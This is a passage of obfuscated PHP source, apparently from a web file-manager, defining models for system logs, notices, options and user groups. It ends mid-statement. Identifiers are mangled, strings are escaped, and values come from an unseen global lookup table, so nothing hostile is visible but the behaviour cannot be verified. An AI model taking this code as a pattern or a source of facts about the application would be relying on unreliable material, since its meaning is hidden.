dÀÍ¸äœãÜ; EªÌ²ôÕô: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\x69\x6d\145", "\164\151\x6d\145", "\151\156\x73\145\x72\164", "\x66\x75\156\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ôÚ²‹˜Í =& $_SERVER[ì™ı‰º¯]; return array($ôÚ²‹˜Í[2191] => LNG($ôÚ²‹˜Í[2192]), $ôÚ²‹˜Í[2193] => LNG($ôÚ²‹˜Í[2194]), $ôÚ²‹˜Í[1802] => LNG($ôÚ²‹˜Í[2195]), $ôÚ²‹˜Í[2196] => LNG($ôÚ²‹˜Í[2197]), $ôÚ²‹˜Í[2198] => LNG($ôÚ²‹˜Í[2199]), $ôÚ²‹˜Í[2200] => LNG($ôÚ²‹˜Í[2201]), $ôÚ²‹˜Í[2202] => LNG($ôÚ²‹˜Í[2203]), $ôÚ²‹˜Í[1832] => LNG($ôÚ²‹˜Í[2203]), $ôÚ²‹˜Í[1833] => LNG($ôÚ²‹˜Í[2204]), $ôÚ²‹˜Í[2205] => LNG($ôÚ²‹˜Í[2206]), $ôÚ²‹˜Í[2207] => LNG($ôÚ²‹˜Í[2208]), $ôÚ²‹˜Í[2209] => LNG($ôÚ²‹˜Í[2210]), $ôÚ²‹˜Í[2211] => LNG($ôÚ²‹˜Í[2212]), $ôÚ²‹˜Í[1830] => LNG($ôÚ²‹˜Í[2213]), $ôÚ²‹˜Í[2214] => LNG($ôÚ²‹˜Í[2215]), $ôÚ²‹˜Í[1837] => LNG($ôÚ²‹˜Í[2216]), $ôÚ²‹˜Í[2217] => LNG($ôÚ²‹˜Í[2218]), $ôÚ²‹˜Í[2219] => LNG($ôÚ²‹˜Í[2220]), $ôÚ²‹˜Í[2221] => LNG($ôÚ²‹˜Í[2222]), $ôÚ²‹˜Í[2223] => LNG($ôÚ²‹˜Í[2224]), $ôÚ²‹˜Í[1840] => LNG($ôÚ²‹˜Í[2225]), $ôÚ²‹˜Í[1841] => LNG($ôÚ²‹˜Í[2226]), $ôÚ²‹˜Í[2227] => LNG($ôÚ²‹˜Í[2228]), $ôÚ²‹˜Í[2229] => LNG($ôÚ²‹˜Í[2230]), $ôÚ²‹˜Í[2231] => LNG($ôÚ²‹˜Í[2232]), $ôÚ²‹˜Í[1835] => LNG($ôÚ²‹˜Í[2233]), $ôÚ²‹˜Í[2234] => LNG($ôÚ²‹˜Í[2235]), $ôÚ²‹˜Í[1834] => LNG($ôÚ²‹˜Í[2236]), $ôÚ²‹˜Í[2237] => LNG($ôÚ²‹˜Í[2238]), $ôÚ²‹˜Í[2239] => LNG($ôÚ²‹˜Í[2240]), $ôÚ²‹˜Í[2241] => LNG($ôÚ²‹˜Í[2242]), $ôÚ²‹˜Í[2243] => LNG($ôÚ²‹˜Í[2243]), $ôÚ²‹˜Í[2244] => LNG($ôÚ²‹˜Í[1806]), $ôÚ²‹˜Í[2245] => LNG($ôÚ²‹˜Í[2246]), $ôÚ²‹˜Í[2247] => LNG($ôÚ²‹˜Í[2248]), $ôÚ²‹˜Í[2249] => LNG($ôÚ²‹˜Í[2250]), $ôÚ²‹˜Í[2251] => LNG($ôÚ²‹˜Í[2252]), $ôÚ²‹˜Í[2253] => LNG($ôÚ²‹˜Í[2254]), $ôÚ²‹˜Í[2255] => LNG($ôÚ²‹˜Í[2255]), $ôÚ²‹˜Í[2256] => LNG($ôÚ²‹˜Í[2257]), $ôÚ²‹˜Í[2258] => LNG($ôÚ²‹˜Í[2259]), $ôÚ²‹˜Í[2260] => LNG($ôÚ²‹˜Í[2261]), $ôÚ²‹˜Í[2262] => LNG($ôÚ²‹˜Í[2263]), $ôÚ²‹˜Í[2264] => LNG($ôÚ²‹˜Í[2265]), $ôÚ²‹˜Í[2266] => LNG($ôÚ²‹˜Í[2267])); } private function typeFile() { $ñŞ¯Œ“‘ =& $_SERVER[ì™ı‰º¯]; $ øÖË¯ = array($ñŞ¯Œ“‘[1837] => array($ñŞ¯Œ“‘[1838]), $ñŞ¯Œ“‘[2209] => array($ñŞ¯Œ“‘[2268]), $ñŞ¯Œ“‘[2211] => array($ñŞ¯Œ“‘[2269]), $ñŞ¯Œ“‘[1830] => array($ñŞ¯Œ“‘[1831]), $ñŞ¯Œ“‘[2219] => array(), $ñŞ¯Œ“‘[2221] => array(), $ñŞ¯Œ“‘[2223] => array(), $ñŞ¯Œ“‘[1840] => array($ñŞ¯Œ“‘[1842]), $ñŞ¯Œ“‘[1841] => array($ñŞ¯Œ“‘[1842]), $ñŞ¯Œ“‘[2227] => array($ñŞ¯Œ“‘[2270]), $ñŞ¯Œ“‘[2229] => array($ñŞ¯Œ“‘[2270]), $ñŞ¯Œ“‘[2231] => array($ñŞ¯Œ“‘[2271]), $ñŞ¯Œ“‘[2217] => array($ñŞ¯Œ“‘[2272]), $ñŞ¯Œ“‘[1835] => array($ñŞ¯Œ“‘[2273]), $ñŞ¯Œ“‘[2234] => array($ñŞ¯Œ“‘[2274]), $ñŞ¯Œ“‘[1834] => array($ñŞ¯Œ“‘[1836])); return $ øÖË¯; } private function typeAll() { $Ëòïôİç =& $_SERVER[ì™ı‰º¯]; $ÆøùìÑ± = $this->typeList; $âÜĞ¢ŞÂ = array_filter($this->typeFile()); foreach ($âÜĞ¢ŞÂ as $åé®ÎİÄ => $ø©Ì»Ã) { $ÆøùìÑ±[$ø©Ì»Ã[0]] = $ÆøùìÑ±[$åé®ÎİÄ]; } $ÆøùìÑ±[$Ëòïôİç[1842]] = LNG($Ëòïôİç[2275]); $ÆøùìÑ±[$Ëòïôİç[2270]] = LNG($Ëòïôİç[2276]); return $ÆøùìÑ±; } public function addLog($ÑñØ‚Ğ¯, $‚ö¦Çõå = array()) { $§âõİ’å =& $_SERVER[ì™ı‰º¯]; if (!isset($this->typeList[$ÑñØ‚Ğ¯])) { return; } $–«¡Û ñ = USER_ID ? USER_ID : (isset($‚ö¦Çõå[$§âõİ’å[1670]]) ? $‚ö¦Çõå[$§âõİ’å[1670]] : 0); if (!$–«¡Û ñ) { $–«¡Û ñ = (int) Session::get($§âõİ’å[1996]); } if ($ÑñØ‚Ğ¯ == $§âõİ’å[2245] && is_array($‚ö¦Çõå[$§âõİ’å[2277]]) && !$‚ö¦Çõå[$§âõİ’å[2277]]) { return; } $ÉƒíúÀŒ = get_client_ip(); if (!$‚ö¦Çõå || strlen(json_encode($‚ö¦Çõå)) >= 1024) { $‚ö¦Çõå = array($§âõİ’å[2278] => $ÉƒíúÀŒ); } else { if (is_array($‚ö¦Çõå)) { $‚ö¦Çõå[$§âõİ’å[2278]] = $ÉƒíúÀŒ; } else { $‚ö¦Çõå = array($§âõİ’å[1201] => $‚ö¦Çõå, $§âõİ’å[2278] => $ÉƒíúÀŒ); } } $‚ö¦Çõå = array($§âõİ’å[1660] => Session::sign(), $§âõİ’å[1661] => $–«¡Û ñ, $§âõİ’å[33] => $ÑñØ‚Ğ¯, $§âõİ’å[1663] => json_encode($‚ö¦Çõå)); parent::add($‚ö¦Çõå); } public function remove($Ó¶ÃÏ¦—) { $this->where(array($_SERVER[ì™ı‰º¯][419] => $Ó¶ÃÏ¦—))->delete(); } private function _makeOrder($÷ŸéŸ  = '') { $¯éÔê÷Ÿ =& $_SERVER[ì™ı‰º¯]; $Ë”“´¡ = $¯éÔê÷Ÿ[201]; $•ï½É‚¨ = array($¯éÔê÷Ÿ[450] => $¯éÔê÷Ÿ[451], $¯éÔê÷Ÿ[452] => $¯éÔê÷Ÿ[453]); $´«æÑÀ¶ = Input::get($¯éÔê÷Ÿ[458], $¯éÔê÷Ÿ[7], $¯éÔê÷Ÿ[2032], array($¯éÔê÷Ÿ[1950], $¯éÔê÷Ÿ[452])); $´«æÑÀ¶ = $•ï½É‚¨[$´«æÑÀ¶]; $÷ŸéŸ  = $÷ŸéŸ  . "{$Ë”“´¡}\x20{$´«æÑÀ¶}"; return $this->order($÷ŸéŸ ); } public function get($»¹ìè‡Æ = '') { $³†ğ—Å¡ =& $_SERVER[ì™ı‰º¯]; if (!$»¹ìè‡Æ) { show_json(array()); } $Œû»•í = array(); if ($»¹ìè‡Æ[$³†ğ—Å¡[1670]]) { $Œû»•í[$³†ğ—Å¡[1670]] = $»¹ìè‡Æ[$³†ğ—Å¡[1670]]; } if (isset($»¹ìè‡Æ[$³†ğ—Å¡[756]])) { $É³ı¶ = $»¹ìè‡Æ[$³†ğ—Å¡[756]]; $ÃÙ¶´•Î = isset($»¹ìè‡Æ[$³†ğ—Å¡[757]]) ? $»¹ìè‡Æ[$³†ğ—Å¡[757]] : time(); $Œû»•í[$³†ğ—Å¡[201]] = array($³†ğ—Å¡[333], array($É³ı¶, $ÃÙ¶´•Î)); } if ($»¹ìè‡Æ[$³†ğ—Å¡[33]]) { $ô‰òÉº = explode($³†ğ—Å¡[50], $»¹ìè‡Æ[$³†ğ—Å¡[33]]); $Û½î‚æÖ = $this->typeFile(); $Õªóøì = array(); foreach ($ô‰òÉº as $Ò¯×ôÏø) { $Õªóøì[] = $Ò¯×ôÏø; if (isset($Û½î‚æÖ[$Ò¯×ôÏø])) { $Õªóøì = array_merge($Õªóøì, $Û½î‚æÖ[$Ò¯×ôÏø]); } } $Õªóøì = array_unique($Õªóøì); if ($Õªóøì) { $Œû»•í[$³†ğ—Å¡[33]] = array($³†ğ—Å¡[7], $Õªóøì); } } else { $Œû»•í[$³†ğ—Å¡[33]] = array($³†ğ—Å¡[2279], $³†ğ—Å¡[2280]); } if (!empty($»¹ìè‡Æ[$³†ğ—Å¡[2278]])) { $Œû»•í[$³†ğ—Å¡[453]] = array($³†ğ—Å¡[383], "\x25{$»¹ìè‡Æ[$³†ğ—Å¡[2278]]}\45"); } $İÈ×èï = $this->_makeOrder()->where($Œû»•í)->selectPage(); if (empty($İÈ×èï[$³†ğ—Å¡[369]])) { show_json(array(), !0, $İÈ×èï[$³†ğ—Å¡[366]]); } $İÈ×èï[$³†ğ—Å¡[369]] = $this->logList($İÈ×èï[$³†ğ—Å¡[369]]); return $İÈ×èï; } private function ipAddress(&$¿Íù×Ù) { $ššòàËµ =& $_SERVER[ì™ı‰º¯]; if (!empty($¿Íù×Ù[$ššòàËµ[2278]])) { $Íî—Ü„ = IpLocation::get($¿Íù×Ù[$ššòàËµ[2278]]); } else { $Íî—Ü„ = LNG($ššòàËµ[2281]); } $¿Íù×Ù[$ššòàËµ[2282]] = $Íî—Ü„; } private function descZipDownload($õÉ˜™¼, &$ºØúÅû¸) { $ñ­è©»ª =& $_SERVER[ì™ı‰º¯]; if (!isset($õÉ˜™¼[$ñ­è©»ª[2283]])) { return; } $•Å›Â±Ş = json_decode($õÉ˜™¼[$ñ­è©»ª[2283]], !0); foreach ($•Å›Â±Ş as $¿®¼æÙ) { try { $”óªÕŸ = IO::infoFull($¿®¼æÙ[$ñ­è©»ª[84]]); } catch (Exception $µô´úüÛ) { continue; } $õÉ˜™¼[$ñ­è©»ª[84]] = $¿®¼æÙ[$ñ­è©»ª[84]]; $ºØúÅû¸[] = $õÉ˜™¼[$ñ­è©»ª[402]] = $”óªÕŸ[$ñ­è©»ª[402]]; $ºØúÅû¸[] = $õÉ˜™¼[$ñ­è©»ª[2086]] = $”óªÕŸ[$ñ­è©»ª[432]]; break; } return $õÉ˜™¼; } private function getSourceList(&$ÉÓÅ¸©) { $¿º¬è—ö =& $_SERVER[ì™ı‰º¯]; $—â‘†Å” = array(); foreach ($ÉÓÅ¸© as $Øâä¥’ => $¢ø„Š¨õ) { $£› ìƒ = json_decode($¢ø„Š¨õ[$¿º¬è—ö[453]], !0); if ($¢ø„Š¨õ[$¿º¬è—ö[33]] == $¿º¬è—ö[1833]) { $£› ìƒ = $this->descZipDownload($£› ìƒ, $—â‘†Å”); $ÉÓÅ¸©[$Øâä¥’][$¿º¬è—ö[453]] = json_encode($£› ìƒ); continue; } if (strpos($¢ø„Š¨õ[$¿º¬è—ö[33]], $¿º¬è—ö[2088]) !== 0) { if (!isset($£› ìƒ[$¿º¬è—ö[84]]) || strpos($¢ø„Š¨õ[$¿º¬è—ö[33]], $¿º¬è—ö[2284]) !== 0) { continue; } try { $Ğ›ñ¡ó‚ = IO::infoFull($£› ìƒ[$¿º¬è—ö[84]]); } catch (Exception $”ûŠµ¶¹) { continue; } $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[402]] = $Ğ›ñ¡ó‚[$¿º¬è—ö[402]]; $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[2086]] = $Ğ›ñ¡ó‚[$¿º¬è—ö[432]]; $ÉÓÅ¸©[$Øâä¥’][$¿º¬è—ö[453]] = json_encode($£› ìƒ); continue; } $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[402]]; $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[2086]]; if ($£› ìƒ[$¿º¬è—ö[33]] == $¿º¬è—ö[548]) { $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[453]][$¿º¬è—ö[1159]]; $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[453]][$¿º¬è—ö[1160]]; } if ($£› ìƒ[$¿º¬è—ö[33]] == $¿º¬è—ö[2096]) { $—â‘†Å”[] = $£› ìƒ[$¿º¬è—ö[453]][$¿º¬è—ö[402]]; } } if (!$—â‘†Å”) { return array(); } return Model($¿º¬è—ö[821])->sourceListInfo($—â‘†Å”, !0); } private function logList($†…ÕŒ¶ş) { $İı‰Ô‡— =& $_SERVER[ì™ı‰º¯]; $‹ºë‹äœ = array_to_keyvalue($†…ÕŒ¶ş, $İı‰Ô‡—[12], $İı‰Ô‡—[1670]); $‡º•øì² = Model($İı‰Ô‡—[525])->userListInfo(array_unique($‹ºë‹äœ)); $ÑáËÉ˜Š = $this->getSourceList($†…ÕŒ¶ş); $Î¶©²’¿ = $this->typeAll(); $âÒôò•ª = array(); $ø§Ğ¦”å = array(); foreach ($†…ÕŒ¶ş as $©Ôˆ œ => $‘‚—Ãæ) { $Î÷Ã¡“‚ = $‘‚—Ãæ[$İı‰Ô‡—[33]]; $ñ§Æ™Îí = isset($‡º•øì²[$‘‚—Ãæ[$İı‰Ô‡—[1670]]]) ? $‡º•øì²[$‘‚—Ãæ[$İı‰Ô‡—[1670]]] : !1; $¨œƒ¤ó = strpos($Î÷Ã¡“‚, $İı‰Ô‡—[2285]) === 0 ? LNG($İı‰Ô‡—[2286]) : LNG($İı‰Ô‡—[2281]); $‘‚—Ãæ[$İı‰Ô‡—[32]] = isset($ñ§Æ™Îí[$İı‰Ô‡—[32]]) ? $ñ§Æ™Îí[$İı‰Ô‡—[32]] : LNG($İı‰Ô‡—[2281]); $‘‚—Ãæ[$İı‰Ô‡—[532]] = isset($ñ§Æ™Îí[$İı‰Ô‡—[532]]) ? $ñ§Æ™Îí[$İı‰Ô‡—[532]] : $İı‰Ô‡—[12]; $‘‚—Ãæ[$İı‰Ô‡—[1569]] = isset($Î¶©²’¿[$Î÷Ã¡“‚]) ? $Î¶©²’¿[$Î÷Ã¡“‚] : $¨œƒ¤ó; $‘‚—Ãæ[$İı‰Ô‡—[2031]] = $ñ§Æ™Îí; $ÍîÔ¸à· = json_decode($‘‚—Ãæ[$İı‰Ô‡—[453]], !0); $‘‚—Ãæ[$İı‰Ô‡—[2278]] = isset($ÍîÔ¸à·[$İı‰Ô‡—[2278]]) ? $ÍîÔ¸à·[$İı‰Ô‡—[2278]] : $İı‰Ô‡—[12]; $‘‚—Ãæ[$İı‰Ô‡—[2282]] = IpLocation::get($‘‚—Ãæ[$İı‰Ô‡—[2278]]); if (strpos($Î÷Ã¡“‚, $İı‰Ô‡—[2088]) === 0 || isset($ÍîÔ¸à·[$İı‰Ô‡—[2086]])) { $ÍîÔ¸à·[$İı‰Ô‡—[87]] = $ÑáËÉ˜Š[$ÍîÔ¸à·[$İı‰Ô‡—[402]]]; $ÍîÔ¸à·[$İı‰Ô‡—[2101]] = $ÑáËÉ˜Š[$ÍîÔ¸à·[$İı‰Ô‡—[2086]]]; if ($ÍîÔ¸à·[$İı‰Ô‡—[33]] == $İı‰Ô‡—[548]) { $ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[1159]] = $ÑáËÉ˜Š[$ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[1159]]]; $ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[1160]] = $ÑáËÉ˜Š[$ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[1160]]]; } if ($ÍîÔ¸à·[$İı‰Ô‡—[33]] == $İı‰Ô‡—[2096]) { $ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[402]] = $ÑáËÉ˜Š[$ÍîÔ¸à·[$İı‰Ô‡—[453]][$İı‰Ô‡—[402]]]; } if ($ÍîÔ¸à·[$İı‰Ô‡—[33]] == $İı‰Ô‡—[1828]) { $ÍîÔ¸à·[$İı‰Ô‡—[2101]] = $ÍîÔ¸à·[$İı‰Ô‡—[87]]; $ÍîÔ¸à·[$İı‰Ô‡—[2086]] = $ÍîÔ¸à·[$İı‰Ô‡—[2101]][$İı‰Ô‡—[402]]; $ÍîÔ¸à·[$İı‰Ô‡—[87]] = !1; $ÍîÔ¸à·[$İı‰Ô‡—[402]] = $İı‰Ô‡—[12]; } if ($ÍîÔ¸à·[$İı‰Ô‡—[87]] && $ÍîÔ¸à·[$İı‰Ô‡—[87]][$İı‰Ô‡—[411]] == $İı‰Ô‡—[1283]) { $ø§Ğ¦”å[] = $‘‚—Ãæ[$İı‰Ô‡—[399]]; unset($†…ÕŒ¶ş[$©Ôˆ œ]); continue; } if ($ÍîÔ¸à·[$İı‰Ô‡—[2101]] && $ÍîÔ¸à·[$İı‰Ô‡—[2101]][$İı‰Ô‡—[411]] == $İı‰Ô‡—[1283]) { $ø§Ğ¦”å[] = $‘‚—Ãæ[$İı‰Ô‡—[399]]; unset($†…ÕŒ¶ş[$©Ôˆ œ]); continue; } } $‘‚—Ãæ[$İı‰Ô‡—[453]] = $ÍîÔ¸à·; unset($‘‚—Ãæ[$İı‰Ô‡—[2287]]); $âÒôò•ª[] = $‘‚—Ãæ; } $this->clearSystemPathLog($ø§Ğ¦”å); return $âÒôò•ª; } private function clearSystemPathLog($°Ø“ÜÎ›) { $õ½§¶»Ÿ =& $_SERVER[ì™ı‰º¯]; if (count($°Ø“ÜÎ›) == 0) { return; } $•ú…ş®Û = array($õ½§¶»Ÿ[399] => array($õ½§¶»Ÿ[7], array_unique($°Ø“ÜÎ›))); $this->where($•ú…ş®Û)->delete(); } public function deviceList($ÊµáıŸê, $‹û¦©Î˜ = 0) { $äş°„šÈ =& $_SERVER[ì™ı‰º¯]; $ĞÙÙìÓ˜ = array($äş°„šÈ[1670] => $ÊµáıŸê, $äş°„šÈ[201] => array($äş°„šÈ[1013], $‹û¦©Î˜), $äş°„šÈ[33] => $äş°„šÈ[1802]); $±×€¾Ïº = array(); $¥ùçğ×­ = $this->field($äş°„šÈ[2288])->where($ĞÙÙìÓ˜)->order($äş°„šÈ[2099])->limit(50)->select(); foreach ($¥ùçğ×­ as $”„“İ“× => $¯¯„•¿š) { if ($”„“İ“× > 0 && abs($¯¯„•¿š[$äş°„šÈ[201]] - $¥ùçğ×­[$”„“İ“× - 1][$äş°„šÈ[201]]) < 5) { continue; } $ÂŞÖ±“ø = json_decode($¯¯„•¿š[$äş°„šÈ[453]], !0); $¯¯„•¿š[$äş°„šÈ[2278]] = isset($ÂŞÖ±“ø[$äş°„šÈ[2278]]) ? $ÂŞÖ±“ø[$äş°„šÈ[2278]] : $äş°„šÈ[12]; unset($ÂŞÖ±“ø[$äş°„šÈ[2278]]); $ÛâÖïïé = $this->deviceType($ÂŞÖ±“ø[$äş°„šÈ[2089]]); if (isset($±×€¾Ïº[$ÛâÖïïé])) { continue; } $¯¯„•¿š[$äş°„šÈ[2282]] = IpLocation::get($¯¯„•¿š[$äş°„šÈ[2278]]); $¯¯„•¿š[$äş°„šÈ[453]] = $ÂŞÖ±“ø; $±×€¾Ïº[$ÛâÖïïé] = $¯¯„•¿š; } return array_values($±×€¾Ïº); } public function deviceType($¼”†²å) { return $¼”†²å; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x6e\x6f\x74\151\x63\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\143\157\x6e\x74\145\156\x74", "\141\x75\x74\150", "\x6d\157\x64\x65", "\164\x69\x6d\x65", "\164\171\x70\x65", "\154\x65\x76\145\154", "\145\x6e\141\142\154\x65", "\163\x6f\x72\164"); public function listData($ô±Ì¿ûñ = false, $ã¢ÚûÕâ = "\163\x6f\162\164", $ËÌ‰®Â— = false) { return parent::listData($ô±Ì¿ûñ, $ã¢ÚûÕâ, $ËÌ‰®Â—); } public function add($†Ö©Ä•Ö) { $‘’·îÏ­ =& $_SERVER[ì™ı‰º¯]; $ù÷ğ²¾Î = time(); if ($†Ö©Ä•Ö[$‘’·îÏ­[16]] == $‘’·îÏ­[2289]) { $ù÷ğ²¾Î = strtotime($†Ö©Ä•Ö[$‘’·îÏ­[180]]); } $†Ö©Ä•Ö[$‘’·îÏ­[180]] = $ù÷ğ²¾Î; return parent::insert($†Ö©Ä•Ö); } public function update($½™ÌëÎ÷, $åÅ»ÂŞñ) { $õŞßïŸ =& $_SERVER[ì™ı‰º¯]; $´’µÀş¿ = $this->listData($½™ÌëÎ÷); if (!$´’µÀş¿) { return !1; } $Ñ®ÚıÎ = time(); if ($åÅ»ÂŞñ[$õŞßïŸ[16]] == $õŞßïŸ[2289]) { $Ñ®ÚıÎ = strtotime($åÅ»ÂŞñ[$õŞßïŸ[180]]); } $åÅ»ÂŞñ[$õŞßïŸ[180]] = $Ñ®ÚıÎ; return parent::update($½™ÌëÎ÷, $åÅ»ÂŞñ); } public function remove($ÃÜƒÒ) { $şĞøû¢† = $this->listData($ÃÜƒÒ); if (!$şĞøû¢† || $şĞøû¢†[$_SERVER[ì™ı‰º¯][1283]]) { return !1; } return parent::remove($ÃÜƒÒ); } public function sort($¦‹¹°É•, $‹ØğÈä) { return parent::update($¦‹¹°É•, $‹ØğÈä); } public function enable($Šé¶ŞÜ, $ÍµÓëı) { return parent::update($Šé¶ŞÜ, array($_SERVER[ì™ı‰º¯][2290] => $ÍµÓëı)); } private function initUserOption() { $‰å£ê€ñ =& $_SERVER[ì™ı‰º¯]; $this->optionType = $‰å£ê€ñ[2291]; $this->modelType = $‰å£ê€ñ[2292]; $this->field = array($‰å£ê€ñ[2293], $‰å£ê€ñ[32], $‰å£ê€ñ[180], $‰å£ê€ñ[33], $‰å£ê€ñ[2294], $‰å£ê€ñ[745], $‰å£ê€ñ[196]); } public function userNoticeGet($ÔÎ¤¤Àá = false) { $this->initUserOption(); return parent::listData($ÔÎ¤¤Àá, $_SERVER[ì™ı‰º¯][399], !0); } public function userNoticeAdd($ä“×¹¤µ) { $à‡îœ˜÷ =& $_SERVER[ì™ı‰º¯]; $this->initUserOption(); $Œó¾×Öı = $this->findByKey($à‡îœ˜÷[2293], $ä“×¹¤µ[$à‡îœ˜÷[399]]); if ($Œó¾×Öı) { return !0; } $åË€Â‡× = array($à‡îœ˜÷[2293] => $ä“×¹¤µ[$à‡îœ˜÷[399]], $à‡îœ˜÷[32] => $ä“×¹¤µ[$à‡îœ˜÷[32]], $à‡îœ˜÷[180] => $ä“×¹¤µ[$à‡îœ˜÷[180]], $à‡îœ˜÷[33] => isset($ä“×¹¤µ[$à‡îœ˜÷[33]]) ? $ä“×¹¤µ[$à‡îœ˜÷[33]] : 1, $à‡îœ˜÷[2294] => isset($ä“×¹¤µ[$à‡îœ˜÷[2294]]) ? $ä“×¹¤µ[$à‡îœ˜÷[2294]] : 0, $à‡îœ˜÷[745] => 0, $à‡îœ˜÷[196] => 0); return parent::insert($åË€Â‡×); } public function userNoticeEdit($à²§†ÁÈ, $¿ÄçéƒÚ) { $this->initUserOption(); return parent::update($à²§†ÁÈ, $¿ÄçéƒÚ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\x6f\x70\x74\151\x6f\156"; protected $jsonField = array("\155\145\156\165", "\x72\157\x6c\145", "\x72\157\x6c\x65\107\x72\x6f\x75\x70", "\x72\x65\147\x69\x73\x74", "\145\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($æÅ¡æ”ó) { return "\123\x79\x73\164\x65\155\x4f\160\x74\x69\x6f\x6e\137{$æÅ¡æ”ó}"; } protected function optionDefault($„Ù¤›“© = '') { $óÚàÃŞ =& $_SERVER[ì™ı‰º¯]; if ($„Ù¤›“© == $óÚàÃŞ[12]) { return $GLOBALS[$óÚàÃŞ[6]][$óÚàÃŞ[381]]; } } } goto c¹œİë˜ãØ; dÌ ñ¦ÒÙ×: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\160"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\x65" => "\x67\162\x6f\165\160\x5f\x6d\x65\x74\x61", "\155\x65\164\141\106\151\x65\x6c\x64" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($À³ˆ«¡³) { $óºîø  =& $_SERVER[ì™ı‰º¯]; return array($óºîø [1937] => array($À³ˆ«¡³[0], $óºîø [1938]), $óºîø [1939] => array($À³ˆ«¡³[0], $óºîø [1940])); } protected function getInfo($ËÏÒ¿ùî, $íî„Ä½ = false) { $“’ç¤ƒ× = $this->getInfoSimple($ËÏÒ¿ùî); if (!$“’ç¤ƒ×) { return !1; } if ($íî„Ä½) { return $this->_listDataApplyItem($“’ç¤ƒ×); } return $this->cacheFunctionGet($_SERVER[ì™ı‰º¯][1941], $ËÏÒ¿ùî); } protected function getInfoSimple($µ¶–÷ƒ, $Ã¨ªƒ´÷ = false) { $ùºô»–ô =& $_SERVER[ì™ı‰º¯]; if ($Ã¨ªƒ´÷) { $ï»²ş†Õ = array($ùºô»–ô[1859] => intval($µ¶–÷ƒ)); $öÑÍÙ» = $this->where($ï»²ş†Õ)->find(); return is_array($öÑÍÙ») ? $öÑÍÙ» : array(); } return $this->cacheFunctionGet($ùºô»–ô[1942], $µ¶–÷ƒ); } protected function groupAdd($›×„ë®ï) { $²ã©ŸØŠ =& $_SERVER[ì™ı‰º¯]; if (!$›×„ë®ï[$²ã©ŸØŠ[432]] && isset($›×„ë®ï[$²ã©ŸØŠ[1859]]) && $›×„ë®ï[$²ã©ŸØŠ[1859]] == 1) { if ($‰„Íê×ƒ = $this->getInfoSimple($›×„ë®ï[$²ã©ŸØŠ[1859]], !0)) { return $›×„ë®ï[$²ã©ŸØŠ[1859]]; } } else { $‰„Íê×ƒ = $this->getInfoSimple($›×„ë®ï[$²ã©ŸØŠ[432]]); if (!$‰„Íê×ƒ) { return !1; } } $‡¥•ËæÕ = $²ã©ŸØŠ[521]; if ($‰„Íê×ƒ[$²ã©ŸØŠ[511]]) { $‡¥•ËæÕ = $‰„Íê×ƒ[$²ã©ŸØŠ[511]] . $‰„Íê×ƒ[$²ã©ŸØŠ[1859]] . $²ã©ŸØŠ[50]; } $ã¿Ó¼€î = array($²ã©ŸØŠ[420] => $this->groupNameAuto($›×„ë®ï[$²ã©ŸØŠ[432]], $›×„ë®ï[$²ã©ŸØŠ[32]]), $²ã©ŸØŠ[401] => $›×„ë®ï[$²ã©ŸØŠ[432]], $²ã©ŸØŠ[580] => $‡¥•ËæÕ, $²ã©ŸØŠ[1943] => $›×„ë®ï[$²ã©ŸØŠ[1846]], $²ã©ŸØŠ[1944] => 0, $²ã©ŸØŠ[1863] => 0); if (isset($›×„ë®ï[$²ã©ŸØŠ[1883]])) { $ã¿Ó¼€î[$²ã©ŸØŠ[1883]] = $›×„ë®ï[$²ã©ŸØŠ[1883]]; } else { $ØîŠÉ®Ü = $this->max($²ã©ŸØŠ[1883]); if (!$ØîŠÉ®Ü) { $ØîŠÉ®Ü = 0; } $ã¿Ó¼€î[$²ã©ŸØŠ[1883]] = $ØîŠÉ®Ü + 1; } if (!empty($›×„ë®ï[$²ã©ŸØŠ[1859]])) { $ã¿Ó¼€î[$²ã©ŸØŠ[1859]] = $›×„ë®ï[$²ã©ŸØŠ[1859]]; } $¨ó¯ÑÃò = $this->add($ã¿Ó¼€î); $this->setNamePinyin($¨ó¯ÑÃò, $ã¿Ó¼€î[$²ã©ŸØŠ[32]]); if (isset($›×„ë®ï[$²ã©ŸØŠ[1945]])) { $this->metaSet($¨ó¯ÑÃò, array($²ã©ŸØŠ[1945] => $›×„ë®ï[$²ã©ŸØŠ[1945]], $²ã©ŸØŠ[1946] => $›×„ë®ï[$²ã©ŸØŠ[1946]])); unset($›×„ë®ï[$²ã©ŸØŠ[1945]]); unset($›×„ë®ï[$²ã©ŸØŠ[1946]]); } Model($²ã©ŸØŠ[1338])->groupRootAdd($¨ó¯ÑÃò); $this->_clearCache($›×„ë®ï[$²ã©ŸØŠ[432]]); return $¨ó¯ÑÃò; } protected function groupEdit($òîÚ×·, $½î ‡È) { $ù€ÎíÖ =& $_SERVER[ì™ı‰º¯]; $è×õ¬ºƒ = $this->getInfoSimple($òîÚ×·); if (!$è×õ¬ºƒ) { return !1; } if (!empty($½î ‡È[$ù€ÎíÖ[432]])) { $Şâ¤”ËË = $this->getInfoSimple($½î ‡È[$ù€ÎíÖ[432]]); if (!$Şâ¤”ËË) { return !1; } if ($è×õ¬ºƒ[$ù€ÎíÖ[1859]] == $Şâ¤”ËË[$ù€ÎíÖ[1859]]) { return 